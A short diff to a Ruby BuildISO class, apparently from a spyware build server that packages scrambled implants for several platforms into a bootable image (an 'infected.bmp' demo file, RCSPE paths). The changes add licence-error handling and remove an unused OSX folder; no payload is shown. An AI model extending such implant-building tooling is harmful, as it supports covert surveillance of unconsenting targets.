@@ -32,7 +32,14 @@ class BuildISO < Build
 
       build.load({'_id' => @factory._id})
       build.unpack
-      build.patch params['binary'].dup
+      begin
+        build.patch params['binary'].dup
+      rescue NoLicenseError => e
+        trace :warn, "Build: #{e.message}"
+        # trap in case of no license for a platform
+        build.clean
+        next
+      end
       build.scramble
 
       names = build.scrambled.dup if platform == 'windows'
@@ -46,6 +53,11 @@ class BuildISO < Build
       FileUtils.cp(File.join(build.tmpdir, 'demo_image'), path("winpe/RCSPE/files/#{platform.upcase}/infected.bmp")) if params['demo']
 
       build.clean
+    end
+
+    # if mac was not built, delete it to avoid errors during installation without osx
+    if Dir[path("winpe/RCSPE/files/OSX/*")].size == 1
+      FileUtils.rm_rf(path("winpe/RCSPE/files/OSX"))
     end
 
     key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
